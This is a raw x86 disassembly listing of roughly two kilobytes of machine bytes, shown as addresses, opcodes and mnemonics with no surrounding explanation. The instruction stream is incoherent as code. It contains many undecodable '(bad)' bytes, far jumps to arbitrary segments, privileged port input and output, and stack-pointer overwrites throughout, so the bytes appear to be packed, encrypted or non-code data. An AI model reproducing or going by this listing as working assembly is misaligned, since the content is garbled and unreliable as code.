  406e63:	sub    esi,DWORD PTR [eax-0x19]
  406e66:	jmp    0x4eaf:0x2f78a49a
  406e6d:	andps  xmm7,XMMWORD PTR [edi-0x77b53531]
  406e74:	clc    
  406e75:	pop    ecx
  406e76:	ins    DWORD PTR es:[edi],dx
  406e77:	test   al,0x8d
  406e79:	mov    ebp,0xdb22a0d9
  406e7e:	xor    dh,BYTE PTR [edx+0x15]
  406e81:	lds    ecx,FWORD PTR [edi-0x5cd7fa21]
  406e87:	scas   eax,DWORD PTR es:[edi]
  406e88:	or     al,0xd3
  406e8a:	sbb    ch,BYTE PTR [ecx-0x15ec5f5a]
  406e90:	mov    esp,0x8ebdbb51
  406e95:	fisttp WORD PTR [edi+ecx*4]
  406e98:	xchg   bh,ch
  406e9a:	cdq    
  406e9b:	pop    edi
  406e9c:	sub    eax,0xab792164
  406ea1:	cdq    
  406ea2:	mov    ecx,0x7fd4e399
  406ea7:	rcr    BYTE PTR [esi-0x73cca5b5],cl
  406ead:	scas   eax,DWORD PTR es:[edi]
  406eae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406eaf:	popf   
  406eb0:	fidivr WORD PTR [ecx]
  406eb2:	jno    0x406e51
  406eb4:	out    0xdd,al
  406eb6:	bound  ecx,QWORD PTR [ebx+eax*1+0x7694915a]
  406ebd:	shl    dh,1
  406ebf:	inc    ebp
  406ec0:	test   BYTE PTR ds:[esi-0x2b10c812],0x6b
  406ec8:	(bad)  [edx+0x32a6ded4]
  406ece:	mov    cl,0x9e
  406ed0:	cs cld 
  406ed2:	sub    al,0xd0
  406ed4:	cli    
  406ed5:	in     al,0x6f
  406ed7:	mov    ah,0xa5
  406ed9:	jmp    0x406eee
  406edb:	lock imul esi,DWORD PTR [ebx+0x355744ba],0x7721b1b5
  406ee6:	add    BYTE PTR ds:0x948d9384,0x9b
  406eed:	in     eax,dx
  406eee:	mov    bl,0x2
  406ef0:	pmulhuw mm2,QWORD PTR [edx+esi*8]
  406ef4:	or     BYTE PTR [ecx-0x29],ch
  406ef7:	mov    al,ds:0x3bf1ac79
  406efc:	sub    eax,0x1935c6d6
  406f01:	addr16 test al,0xc7
  406f04:	test   BYTE PTR [ebp+0x2b],dl
  406f07:	sub    DWORD PTR [esi-0x53c61d0f],eax
  406f0d:	ss inc esp
  406f0f:	popf   
  406f10:	pushf  
  406f11:	jge    0x406f47
  406f13:	xchg   ecx,eax
  406f14:	push   edi
  406f15:	mov    edi,0xa986b5f2
  406f1a:	ret    0x7d17
  406f1d:	inc    esp
  406f1e:	xor    BYTE PTR [ebx+ecx*2],bh
  406f21:	leave  
  406f22:	and    BYTE PTR [ebx+0x2],al
  406f25:	adc    eax,0x8f3b6877
  406f2a:	sub    BYTE PTR ds:0x71f1a6d5,dl
  406f30:	push   ds
  406f31:	xchg   ebx,eax
  406f32:	nop
  406f33:	jns    0x406ef5
  406f35:	mov    edi,0xa859e2d4
  406f3a:	out    dx,al
  406f3b:	pop    edi
  406f3c:	pop    es
  406f3d:	or     eax,0x2d65c8e9
  406f42:	(bad)  
  406f43:	mov    edx,0xd84165b0
  406f48:	and    edx,edx
  406f4a:	(bad)
  406f4f:	cdq    
  406f50:	xchg   edx,eax
  406f51:	mov    dh,0x68
  406f53:	xor    eax,0xbdc3883e
  406f58:	iret   
  406f59:	add    al,dh
  406f5b:	jbe    0x406f41
  406f5d:	mov    al,ds:0xf3e5772
  406f62:	add    al,0x7e
  406f64:	mov    ds:0x3eee2865,al
  406f69:	aas    
  406f6a:	pop    ebx
  406f6b:	sub    DWORD PTR [ebx-0x4f789786],0xae6c3c4d
  406f75:	sti    
  406f76:	sub    edx,DWORD PTR [edx+0x46]
  406f79:	mov    al,ds:0x73972a1
  406f7e:	xor    ebp,edx
  406f80:	jp     0x406fe2
  406f82:	call   0xe8236cf0
  406f87:	inc    ebp
  406f88:	pusha  
  406f89:	inc    ebx
  406f8a:	xor    dh,BYTE PTR [ebx+0x346ab486]
  406f90:	test   BYTE PTR [ecx-0x78],0x15
  406f94:	imul   ebp,DWORD PTR [esp+esi*8],0xe091b624
  406f9b:	jbe    0x406fbf
  406f9d:	inc    ebp
  406f9e:	lahf   
  406f9f:	jle    0x406f9f
  406fa1:	xlat   BYTE PTR ds:[ebx]
  406fa2:	sub    esp,edi
  406fa4:	sbb    al,BYTE PTR [ebx+0x32200d90]
  406faa:	lds    edx,FWORD PTR [edi+0x2b]
  406fad:	aad    0x91
  406faf:	fldcw  WORD PTR [ecx+0x3b98f4b7]
  406fb5:	adc    DWORD PTR [ebx-0x1bb72ad],0x117e1b6e
  406fbf:	popf   
  406fc0:	cdq    
  406fc1:	add    eax,0xa5e72c52
  406fc6:	ret    0x6d46
  406fc9:	fwait
  406fca:	retf   
  406fcb:	mov    eax,0xa9df57c8
  406fd0:	jnp    0x406ff8
  406fd2:	(bad)  
  406fd3:	sub    al,0x74
  406fd5:	outs   dx,BYTE PTR ds:[esi]
  406fd6:	jmp    0x406f6d
  406fd8:	and    bl,al
  406fda:	jle    0x406f81
  406fdc:	imul   ebp,edi,0xffffffd1
  406fdf:	call   0x1a6:0x6f68cbd1
  406fe6:	jle    0x407061
  406fe8:	rcl    DWORD PTR ds:[edi-0x65],0x5f
  406fed:	push   edi
  406fee:	lods   eax,DWORD PTR ds:[esi]
  406fef:	in     eax,dx
  406ff0:	xor    cl,BYTE PTR [ebx-0x36]
  406ff3:	prefetch BYTE PTR [edx-0x36]
  406ff7:	lods   al,BYTE PTR ds:[esi]
  406ff8:	xchg   edi,eax
  406ff9:	out    dx,eax
  406ffa:	test   al,0xad
  406ffc:	or     BYTE PTR [eax+0x18415578],dh
  407002:	jo     0x40707c
  407004:	mov    dl,0xb5
  407006:	jae    0x40707a
  407008:	popw   ds
  40700a:	add    BYTE PTR [edx+eiz*2+0xb21d7c0],dl
  407011:	je     0x40706c
  407013:	(bad)
  407017:	fwait
  407018:	call   0x4f97b461
  40701d:	scas   al,BYTE PTR es:[edi]
  40701e:	cmp    DWORD PTR [ecx+ecx*1-0x43],ebx
  407022:	mov    bl,0x21
  407024:	and    DWORD PTR [ebp+0x71c1000f],edx
  40702a:	sar    DWORD PTR [ebp+0x58],0xe4
  40702e:	jmp    0xdf29:0xb7283284
  407035:	inc    edi
  407036:	jmp    0x86a9:0x245fbd35
  40703d:	shl    DWORD PTR [ebx],cl
  40703f:	cmp    eax,0xe28ca8b5
  407044:	out    0xae,eax
  407046:	mov    ch,0xa4
  407048:	push   ss
  407049:	add    DWORD PTR [edi+0x1b],esp
  40704c:	sub    al,0xad
  40704e:	into   
  40704f:	lods   al,BYTE PTR ds:[esi]
  407050:	cmc    
  407051:	scas   al,BYTE PTR es:[edi]
  407052:	and    al,0x8b
  407054:	ins    DWORD PTR es:[edi],dx
  407055:	mov    esp,0x38133542
  40705a:	cwde   
  40705b:	cmp    al,0x12
  40705d:	adc    ebp,ebx
  40705f:	pop    esp
  407060:	sub    dh,ch
  407062:	test   eax,0x5852426a
  407067:	mov    ch,0xbf
  407069:	inc    edx
  40706a:	call   0xdafc67e6
  40706f:	mov    edi,DWORD PTR [ecx-0x2f]
  407072:	inc    edx
  407073:	jg     0x407048
  407075:	adc    eax,0x8f2ba11e
  40707a:	fdivr  QWORD PTR [edx]
  40707c:	popa   
  40707d:	and    al,0x29
  40707f:	sub    dh,BYTE PTR [ebp+0x60]
  407082:	dec    esi
  407083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407084:	(bad)  
  407085:	push   eax
  407086:	dec    edx
  407087:	mov    al,0x8d
  407089:	jns    0x407098
  40708b:	jbe    0x407076
  40708d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40708e:	mov    dh,0x34
  407090:	adc    ah,BYTE PTR [eax+0x77]
  407093:	ror    BYTE PTR [esp+eax*8-0x34],1
  407097:	mov    ebx,0xf248d0c7
  40709c:	or     DWORD PTR [edx+0x2c7e0033],ebp
  4070a2:	xchg   esi,eax
  4070a3:	xchg   edi,eax
  4070a4:	cs inc edx
  4070a6:	xchg   ebx,eax
  4070a7:	fld    DWORD PTR [eax]
  4070a9:	pop    esi
  4070aa:	adc    ch,BYTE PTR [ebp-0x1f01af1d]
  4070b0:	je     0x40707c
  4070b2:	in     eax,dx
  4070b3:	push   edx
  4070b4:	je     0x4070c9
  4070b6:	dec    esi
  4070b7:	mov    ebx,0xad21710f
  4070bc:	pusha  
  4070bd:	(bad)  [ebp-0x55]
  4070c0:	scas   al,BYTE PTR es:[edi]
  4070c1:	pop    esp
  4070c2:	popf   
  4070c3:	fldenv [ebp-0x443a112d]
  4070c9:	sub    edx,DWORD PTR [esi+0x50db0f98]
  4070cf:	bound  esp,QWORD PTR [edi-0xa]
  4070d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070d3:	repnz mov DWORD PTR [ebx+0x4ad3ec45],esp
  4070da:	arpl   WORD PTR ds:0x2e765ede,sp
  4070e1:	pop    ecx
  4070e2:	push   cs
  4070e3:	lea    edi,[eax+ebp*4]
  4070e6:	sbb    BYTE PTR [ebp+0x4f],al
  4070e9:	inc    ebx
  4070ea:	pop    ebp
  4070eb:	mov    ds:0x318bbfc3,al
  4070f0:	inc    ebp
  4070f1:	pop    es
  4070f2:	jle    0x407084
  4070f4:	xchg   ah,bh
  4070f6:	mov    ah,0x1b
  4070f8:	push   es
  4070f9:	shl    DWORD PTR [edx-0x3c0a20ee],cl
  4070ff:	cmp    esp,DWORD PTR [ecx-0x19]
  407102:	pushf  
  407103:	xor    eax,0x826ba9fb
  407108:	cmp    cl,0x3b
  40710b:	js     0x40713a
  40710d:	je     0x407144
  40710f:	sub    ah,dl
  407111:	sub    BYTE PTR [edi],dh
  407113:	adc    dh,ch
  407115:	jge    0x407125
  407117:	push   es
  407118:	inc    eax
  407119:	jnp    0x407170
  40711b:	int3   
  40711c:	pop    es
  40711d:	lea    ebx,[esi-0x4b]
  407120:	mov    esi,0xe34edd48
  407125:	xor    BYTE PTR [esi],bh
  407127:	sub    al,0x63
  407129:	xchg   esp,eax
  40712a:	cmp    ah,dh
  40712c:	jo     0x40713f
  40712e:	dec    eax
  40712f:	jne    0x4070c0
  407131:	(bad)  
  407132:	(bad)  
  407133:	in     eax,dx
  407134:	shl    DWORD PTR [ebx+0xd035882],cl
  40713a:	pusha  
  40713b:	and    edx,DWORD PTR [esi]
  40713d:	and    al,0xd8
  40713f:	lds    esi,FWORD PTR [bx+di]
  407142:	popf   
  407143:	aad    0x79
  407145:	or     eax,ecx
  407147:	push   ecx
  407148:	inc    edx
  407149:	fidiv  DWORD PTR [edx+0x1a63d780]
  40714f:	sub    al,0xdd
  407151:	cdq    
  407152:	xor    BYTE PTR [eax+0x73],0x7a
  407156:	test   DWORD PTR [edi],eax
  407158:	and    eax,0x1397ee0d
  40715d:	loop   0x407150
  40715f:	call   0x1ee2:0xf103af5d
  407166:	sbb    al,0x32
  407168:	cmc    
  407169:	push   ecx
  40716a:	dec    eax
  40716b:	xlat   BYTE PTR ds:[ebx]
  40716c:	pop    es
  40716d:	aaa    
  40716e:	cs mov ebx,0x45220278
  407174:	cmc    
  407175:	shl    DWORD PTR [ebp-0x4c],1
  407178:	scas   eax,DWORD PTR es:[edi]
  407179:	call   FWORD PTR [edi]
  40717b:	push   edi
  40717c:	stos   DWORD PTR es:[edi],eax
  40717d:	mov    al,0x0
  40717f:	jmp    0x2cfb:0xc4b73d45
  407186:	add    BYTE PTR [ebx-0x23534235],al
  40718c:	fidiv  WORD PTR ds:0x4adc92a6
  407192:	outs   dx,BYTE PTR ds:[esi]
  407193:	ret    0x2564
  407196:	mov    BYTE PTR [edx-0x3bc608ba],al
  40719c:	mov    ch,BYTE PTR [ecx-0x47]
  40719f:	xchg   edx,eax
  4071a0:	jmp    0x4071e7
  4071a2:	addr16 pop ebp
  4071a4:	ret    
  4071a5:	sar    esp,cl
  4071a7:	sbb    bl,BYTE PTR [esi-0xa]
  4071aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071ab:	call   0xd0bb1e47
  4071b0:	sub    al,0x39
  4071b2:	dec    esi
  4071b3:	pop    edx
  4071b4:	stos   DWORD PTR es:[edi],eax
  4071b5:	jp     0x4071d0
  4071b7:	pop    edx
  4071b8:	adc    esp,edi
  4071ba:	inc    ecx
  4071bb:	fldcw  WORD PTR [eax-0x7a]
  4071be:	cmp    ah,BYTE PTR [ecx]
  4071c0:	dec    edx
  4071c1:	xor    esi,edx
  4071c3:	dec    eax
  4071c4:	push   esi
  4071c5:	pop    esp
  4071c6:	test   eax,0xd7b6df44
  4071cb:	mov    esp,0xb1a8fe1b
  4071d0:	iret   
  4071d1:	mov    dl,0x24
  4071d3:	xchg   edi,eax
  4071d4:	sbb    BYTE PTR [edx-0x6c],al
  4071d7:	popa   
  4071d8:	(bad)  
  4071d9:	jmp    0x7c38d979
  4071de:	xchg   edi,eax
  4071df:	(bad)  
  4071e0:	mov    BYTE PTR [eax+esi*2+0x53cb1609],al
  4071e7:	xchg   ebx,edx
  4071e9:	xlat   BYTE PTR ds:[ebx]
  4071ea:	cmp    al,BYTE PTR [ebx]
  4071ec:	inc    esi
  4071ed:	push   es
  4071ee:	in     eax,dx
  4071ef:	sub    DWORD PTR [esi+0x71],eax
  4071f2:	push   edi
  4071f3:	xlat   BYTE PTR ds:[ebx]
  4071f4:	mov    eax,0x5d567cca
  4071f9:	inc    esi
  4071fa:	shr    BYTE PTR [edi+0x5e956a3a],cl
  407200:	scas   al,BYTE PTR es:[edi]
  407201:	mov    ds:0xb7d9fe75,al
  407206:	dec    eax
  407207:	dec    esp
  407208:	mov    al,ds:0xae34a5cd
  40720d:	std    
  40720e:	imul   edx,DWORD PTR [ebx],0xffffffc3
  407211:	in     al,dx
  407212:	clc    
  407213:	bound  esi,QWORD PTR [ebp+0x7c10f5a1]
  407219:	sub    ah,cl
  40721b:	fdiv   DWORD PTR [ecx+0x18554252]
  407221:	mov    dl,0xbc
  407223:	cli    
  407224:	nop
  407225:	jbe    0x40726d
  407227:	jnp    0x40723d
  407229:	mov    eax,ds:0x832976d5
  40722e:	cs push 0x9df2b95a
  407234:	lods   eax,DWORD PTR ds:[esi]
  407235:	imul   esi,DWORD PTR [esi+ecx*2-0xd1b8b39],0x60
  40723d:	scas   al,BYTE PTR es:[edi]
  40723e:	lds    edx,FWORD PTR [ecx-0x1a43d466]
  407244:	je     0x407245
  407246:	inc    ebx
  407247:	addr16 jae 0x407214
  40724a:	xor    al,0xb9
  40724c:	div    DWORD PTR [edx]
  40724e:	push   es
  40724f:	sbb    al,0xb5
  407251:	pop    ds
  407252:	mov    ch,0x62
  407254:	and    bh,dh
  407256:	xor    bl,BYTE PTR ds:0x84b0da3e
  40725c:	fisub  DWORD PTR [edi]
  40725e:	scas   al,BYTE PTR es:[edi]
  40725f:	adc    eax,0xf1ca70a0
  407264:	push   0xffffff9d
  407266:	idiv   BYTE PTR [esi]
  407268:	sbb    al,0xec
  40726a:	imul   DWORD PTR [esi+0x59]
  40726d:	cmp    BYTE PTR [esi+0x53],bl
  407270:	lahf   
  407271:	cld    
  407272:	push   esp
  407273:	dec    ecx
  407274:	outs   dx,DWORD PTR ds:[esi]
  407275:	pop    edx
  407276:	add    edx,esi
  407278:	xchg   ebp,eax
  407279:	or     al,0x65
  40727b:	jnp    0x4072b3
  40727d:	push   0x58
  40727f:	not    BYTE PTR [edx-0x16]
  407282:	push   ebx
  407283:	rol    DWORD PTR [esi-0x1a8db968],0x19
  40728a:	fcmovne st,st(6)
  40728c:	mov    ah,0x2
  40728e:	mov    bh,0xdc
  407290:	pusha  
  407291:	ss dec ebp
  407293:	mov    eax,0x3cede68b
  407298:	jno    0x4072db
  40729a:	fcomp  DWORD PTR [ebx-0x22980437]
  4072a0:	jmp    0x32f2efb1
  4072a5:	dec    eax
  4072a6:	xor    BYTE PTR [ebx+edi*2],dl
  4072a9:	sbb    cl,BYTE PTR [ebx+eax*1+0x32]
  4072ad:	pop    esi
  4072ae:	pushf  
  4072af:	mov    ecx,0xb1bcdc4c
  4072b4:	outs   dx,DWORD PTR ds:[esi]
  4072b5:	dec    DWORD PTR [eax-0x2b831ab1]
  4072bb:	ret    
  4072bc:	inc    edx
  4072bd:	in     eax,dx
  4072be:	test   eax,0xd14dccb2
  4072c3:	cmp    BYTE PTR [ebp+0xd9f2d01],bh
  4072c9:	jb     0x40733b
  4072cb:	jl     0x407323
  4072cd:	dec    edi
  4072ce:	mov    ch,0xbc
  4072d0:	hlt    
  4072d1:	inc    esp
  4072d2:	adc    BYTE PTR [esi-0x73],ah
  4072d5:	mov    ds:0x953bf5c1,eax
  4072da:	or     edx,DWORD PTR [ebx]
  4072dc:	ja     0x407288
  4072de:	or     al,0x5a
  4072e0:	inc    edi
  4072e1:	stos   DWORD PTR es:[edi],eax
  4072e2:	xchg   ah,bh
  4072e4:	push   edx
  4072e5:	cmp    al,0xdf
  4072e7:	into   
  4072e8:	fst    QWORD PTR [eax]
  4072ea:	cmp    al,0x96
  4072ec:	inc    ebx
  4072ed:	arpl   bx,bp
  4072ef:	mov    ah,0xeb
  4072f1:	add    eax,0xab982a91
  4072f6:	xchg   BYTE PTR [ebx],bl
  4072f8:	aas    
  4072f9:	xor    BYTE PTR [edx+0x2b823fa2],bh
  4072ff:	jp     0x40733e
  407301:	fiadd  DWORD PTR [ecx]
  407303:	loope  0x407290
  407305:	stos   DWORD PTR es:[edi],eax
  407306:	imul   ebp,DWORD PTR [edx],0x20
  407309:	ss in  al,0x64
  40730c:	jmp    0x806a706c
  407311:	xor    bh,BYTE PTR [ecx]
  407313:	aas    
  407314:	lods   al,BYTE PTR ds:[esi]
  407315:	sbb    BYTE PTR [ebx],0x8d
  407318:	pop    edi
  407319:	pop    es
  40731a:	(bad)
  40731d:	pop    esi
  40731e:	dec    ecx
  40731f:	sbb    DWORD PTR [ecx-0x12985f],ebx
  407325:	lahf   
  407326:	mov    edx,0xed5e9f3b
  40732b:	les    edi,FWORD PTR [ebx+0x6c]
  40732e:	shl    BYTE PTR [eax+0x8d080d5],1
  407334:	mov    esi,DWORD PTR [edi+0x30]
  407337:	adc    al,0x72
  407339:	test   DWORD PTR [edi+0x11],edx
  40733c:	push   edi
  40733d:	cld    
  40733e:	shl    BYTE PTR [edx-0x55adcd1f],1
  407344:	ret    0x736e
  407347:	sbb    eax,0xb93d65c9
  40734c:	adc    al,0x6e
  40734e:	cmp    al,BYTE PTR [ecx+esi*2]
  407351:	mov    al,ds:0xecbcc3aa
  407356:	sbb    al,0x7f
  407358:	mov    dh,0x6f
  40735a:	pop    esi
  40735b:	xor    ebx,DWORD PTR [eax]
  40735d:	scas   eax,DWORD PTR es:[edi]
  40735e:	cld    
  40735f:	test   al,0xcb
  407361:	jle    0x4073d3
  407363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407364:	pusha  
  407365:	lea    esi,[ecx-0x71a4805d]
  40736b:	popf   
  40736c:	out    dx,al
  40736d:	adc    esi,esp
  40736f:	rcr    ecx,cl
  407371:	daa    
  407372:	pop    ss
  407373:	out    0x13,al
  407375:	test   eax,0x9a4b5ed5
  40737a:	out    0x58,eax
  40737c:	not    BYTE PTR [esi-0x2e3c871c]
  407382:	inc    edx
  407383:	shr    BYTE PTR [ebp-0xf7f0438],1
  407389:	sub    ebp,DWORD PTR ds:0x84b2efb0
  40738f:	scas   al,BYTE PTR es:[edi]
  407390:	addr16 rcl bl,1
  407393:	push   esp
  407394:	or     al,0x64
  407396:	mov    ds:0x9ecabd4b,al
  40739b:	or     ch,BYTE PTR [ebx+0x7fbf9e1a]
  4073a1:	and    edi,esi
  4073a3:	xor    esi,DWORD PTR [edi-0x74]
  4073a6:	sub    bh,ah
  4073a8:	aad    0x4a
  4073aa:	pusha  
  4073ab:	test   BYTE PTR [edi+esi*1+0x64],cl
  4073af:	das    
  4073b0:	fsubr  DWORD PTR [ebp+0x22]
  4073b3:	adc    al,BYTE PTR [edi-0x10]
  4073b6:	cli    
  4073b7:	mov    di,0x2af3
  4073bb:	inc    bp
  4073bd:	inc    esi
  4073be:	xchg   ebp,eax
  4073bf:	push   ebx
  4073c0:	xchg   BYTE PTR [esi],dl
  4073c2:	mov    al,ds:0x5c17be54
  4073c7:	xchg   edx,eax
  4073c8:	pop    ebx
  4073c9:	ret    
  4073ca:	mov    ch,0xcf
  4073cc:	mov    ds:0xc0acff77,eax
  4073d1:	inc    ecx
  4073d2:	xlat   BYTE PTR ds:[ebx]
  4073d3:	jecxz  0x4073f1
  4073d5:	fiadd  DWORD PTR [ebp+0x7c]
  4073d8:	mov    esi,DWORD PTR ds:0xd2cb28ac
  4073de:	add    eax,0x77e85826
  4073e3:	xchg   esp,eax
  4073e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073e5:	data16 fmul DWORD PTR [ecx+0x53]
  4073e9:	pop    edi
  4073ea:	adc    eax,0xec1fe3d3
  4073ef:	adc    eax,0x8ea5940a
  4073f4:	cmp    bl,BYTE PTR ds:0xae0e0e2f
  4073fa:	inc    esi
  4073fb:	jle    0x407433
  4073fd:	popa   
  4073fe:	and    DWORD PTR ds:0xd6977da9,edi
  407404:	(bad)  
  407405:	inc    ebp
  407406:	adc    eax,0x9b48ded1
  40740b:	pop    edi
  40740c:	xor    DWORD PTR [edi+0x7e],edi
  40740f:	fwait
  407410:	ror    DWORD PTR [edi],cl
  407412:	push   edi
  407413:	or     DWORD PTR [eax-0x6aabe40f],ebp
  407419:	add    eax,0x1af854d0
  40741e:	(bad)  
  40741f:	xchg   esp,eax
  407420:	jbe    0x407495
  407422:	nop
  407423:	shr    DWORD PTR [edi],1
  407425:	jg     0x40741e
  407427:	mul    al
  407429:	add    DWORD PTR [ecx-0x6],edi
  40742c:	xor    eax,0x6607de8c
  407431:	xor    al,0xe8
  407433:	push   ss
  407434:	inc    ecx
  407435:	inc    edx
  407436:	cmc    
  407437:	xor    eax,0xbec418cb
  40743c:	mov    bh,0x54
  40743e:	mov    ecx,DWORD PTR [ebx+edi*4-0x3b9c29aa]
  407445:	std    
  407446:	mov    ds:0x3a513b35,eax
  40744b:	mov    cl,0x12
  40744d:	add    al,0x2b
  40744f:	or     eax,DWORD PTR [ebp+0x40]
  407452:	ja     0x4073d6
  407454:	inc    ecx
  407455:	retf   0x4ce9
  407458:	cld    
  407459:	jne    0x40746c
  40745b:	dec    ecx
  40745c:	call   0x85950609
  407461:	sbb    ebp,DWORD PTR [ebx-0x457e2b1a]
  407467:	sub    cl,0x9
  40746a:	scas   eax,DWORD PTR es:[edi]
  40746b:	cmc    
  40746c:	or     esp,DWORD PTR [eax+0x77]
  40746f:	js     0x40741c
  407471:	mov    ds:0xba28c705,al
  407476:	jle    0x407490
  407478:	mov    DWORD PTR cs:[esp+edi*2+0x17],ebx
  40747d:	pop    ebx
  40747e:	mov    eax,0x905543c0
  407483:	jns    0x4074ec
  407485:	cdq    
  407486:	dec    edx
  407487:	push   esi
  407488:	jg     0x407504
  40748a:	mov    dh,0x85
  40748c:	pop    esp
  40748d:	pop    edx
  40748e:	inc    ebp
  40748f:	inc    ecx
  407490:	aad    0x5d
  407492:	leave  
  407493:	mov    dl,0xd
  407495:	neg    DWORD PTR ss:[edx+0xccbb63d]
  40749c:	sub    DWORD PTR [ecx-0x78],edi
  40749f:	and    al,0x60
  4074a1:	mov    edi,0x1dcfd65a
  4074a6:	test   BYTE PTR [esi-0x4f],ch
  4074a9:	das    
  4074aa:	shl    DWORD PTR [edx+0x5bb22aa9],1
  4074b0:	push   DWORD PTR [ecx]
  4074b2:	js     0x4074f0
  4074b4:	ds push ss
  4074b6:	pop    esi
  4074b7:	xchg   BYTE PTR [ecx-0x1864491d],al
  4074bd:	xchg   esi,eax
  4074be:	xchg   ebx,eax
  4074bf:	sub    DWORD PTR [ebx+0x7f6872de],edi
  4074c5:	push   ebx
  4074c6:	cmp    BYTE PTR [eax+eiz*8-0xadf8b31],dh
  4074cd:	fmul   DWORD PTR [ebx+0x26892566]
  4074d3:	ins    BYTE PTR es:[edi],dx
  4074d4:	cmp    bh,BYTE PTR [ecx-0x38]
  4074d7:	or     BYTE PTR [ecx],0xaa
  4074da:	out    0xac,eax
  4074dc:	lock push es
  4074de:	jmp    0x63ec084c
  4074e3:	int3   
  4074e4:	or     eax,0x62e2b0d3
  4074e9:	stc    
  4074ea:	arpl   WORD PTR [esi+eax*1-0x5e634117],dx
  4074f1:	cmc    
  4074f2:	retf   0x9f1b
  4074f5:	pop    ebp
  4074f6:	mov    esi,0x778cd2bc
  4074fb:	jmp    0x4074ae
  4074fd:	mov    ebp,edx
  4074ff:	(bad)  
  407501:	mov    ds:0x5fd093a6,al
  407506:	and    eax,0x57c8bcba
  40750b:	(bad)  [ecx+0x1e]
  40750e:	adc    cl,ch
  407510:	sbb    ecx,0xffffffc3
  407513:	loopne 0x40749a
  407515:	jg     0x4074c8
  407517:	xchg   ebp,eax
  407518:	shr    BYTE PTR [edi-0x33e66651],0xbe
  40751f:	scas   eax,DWORD PTR es:[edi]
  407520:	iret   
  407521:	push   ds
  407522:	gs sub dh,0x6a
  407526:	call   FWORD PTR [edi]
  407528:	xchg   ecx,eax
  407529:	(bad)  
  40752a:	loopne 0x4074bf
  40752c:	add    cl,BYTE PTR ds:0x10c8f35b
  407532:	ins    BYTE PTR es:[edi],dx
  407533:	mov    dh,0xb8
  407535:	mov    ebp,0xd5e904b6
  40753a:	rcr    DWORD PTR [esp+ebx*8],cl
  40753d:	dec    edx
  40753e:	sub    eax,0xd48b30b1
  407543:	mov    dh,0x77
  407545:	ja     0x40752f
  407547:	xchg   bl,bh
  407549:	ret    0x6f7b
  40754c:	add    bl,bl
  40754e:	sar    BYTE PTR cs:[ebp+0xf713a1c],0x7a
  407556:	jle    0x4074f5
  407558:	add    ebx,edi
  40755a:	jbe    0x4075d3
  40755c:	test   DWORD PTR [ecx],0x6c411
  407562:	aaa    
  407563:	outs   dx,DWORD PTR ds:[esi]
  407564:	push   edx
  407565:	mov    ecx,0x810789dc
  40756a:	inc    esi
  40756b:	int3   
  40756c:	inc    edx
  40756d:	adc    BYTE PTR [ecx-0x43],al
  407570:	aam    0xd4
  407572:	sub    BYTE PTR [ebx],dh
  407574:	or     ch,BYTE PTR [ebp-0xf]
  407577:	rcl    DWORD PTR [edi+0x624f92a2],0x82
  40757e:	or     DWORD PTR [edx],edx
  407580:	pop    esi
  407581:	fidiv  WORD PTR [eax]
  407583:	jle    0x407574
  407585:	jmp    FWORD PTR ds:0x2a32181d
  40758b:	mov    esp,0x6f956f48
  407590:	bound  ebx,QWORD PTR [ecx-0x71]
  407593:	(bad)  [ebx-0x535008ce]
  407599:	sar    DWORD PTR [eax],0x98
  40759c:	fwait
  40759d:	and    BYTE PTR [ecx],cl
  40759f:	cs aaa 
  4075a1:	jnp    0x407609
  4075a3:	cmp    BYTE PTR [eax+0x4],cl
  4075a6:	push   eax
  4075a7:	lock loopne 0x4075e9
  4075aa:	ror    DWORD PTR [ebx+0x44],1
  4075ad:	idiv   BYTE PTR [ecx+edx*1+0x562fae2a]
  4075b4:	xchg   ebx,eax
  4075b5:	aam    0xc0
  4075b7:	mov    bh,BYTE PTR [eax-0x7b]
  4075ba:	(bad)  
  4075bb:	std    
  4075bc:	inc    esi
  4075bd:	dec    ecx
  4075bf:	jge    0x4075a1
  4075c1:	or     al,0xe2
  4075c3:	(bad)  
  4075c4:	push   eax
  4075c5:	into   
  4075c6:	out    0xb3,eax
  4075c8:	out    dx,al
  4075c9:	pop    ecx
  4075ca:	in     al,dx
  4075cb:	push   cs
  4075cc:	xchg   edi,eax
  4075cd:	pop    es
  4075ce:	js     0x40761e
  4075d0:	sub    DWORD PTR ss:[edi],ecx
  4075d3:	rcl    DWORD PTR ds:0x43ef7e1b,1
  4075d9:	pushf  
  4075da:	add    al,BYTE PTR [ecx-0x47afd301]
  4075e0:	inc    edx
  4075e1:	cmp    DWORD PTR [ebx+edx*4],ecx
  4075e4:	das    
  4075e5:	in     al,dx
  4075e6:	push   es
  4075e7:	pop    ds
  4075e8:	mov    dl,0x6f
  4075ea:	push   ds
  4075eb:	xor    BYTE PTR [ecx],0xeb
  4075ee:	inc    ecx
  4075ef:	jp     0x407595
  4075f1:	retf   0xa358
  4075f4:	ins    BYTE PTR es:[edi],dx
  4075f5:	jno    0x4075f6
  4075f7:	dec    edi
  4075f8:	jmp    0xea4a:0x331fdfcc
  4075ff:	cmc    
  407600:	mov    esi,0x8a0c6cf7
  407605:	mov    edi,edx
  407607:	stos   BYTE PTR es:[edi],al
  407608:	bound  ecx,QWORD PTR [edi-0x41]
  40760b:	jl     0x4075ed
  40760d:	arpl   WORD PTR [edi+0x7d],sp
  407610:	add    eax,0x7278f34
  407615:	jae    0x40767a
  407617:	fld    DWORD PTR [eax+0x48]
  40761a:	lods   eax,DWORD PTR ds:[esi]
  40761b:	repnz pop ebx
  40761d:	add    DWORD PTR [edi+0x46],edx
  407620:	cmp    BYTE PTR [ebx],cl
  407622:	dec    esi
  407623:	retf   0x233c
  407626:	pushf  
  407627:	xor    BYTE PTR [ecx+0x65],ah
  40762a:	inc    ebx
  40762b:	mov    edx,0x8b0cb36
  407630:	imul   edi,ecx,0x21337777
  407636:	fdivrp st(3),st
  407638:	mov    ch,0xff
  40763a:	adc    al,0x72
  40763c:	jmp    0xd97c:0x63047598
  407643:	addr16 xchg esi,eax
  407645:	ret    0x8ee4
  407648:	jle    0x407641
  40764a:	sbb    eax,0x2e5a3079
  40764f:	inc    eax
  407650:	lahf   
  407651:	lods   eax,DWORD PTR ds:[esi]
  407652:	jp     0x40763b
  407654:	loope  0x407675
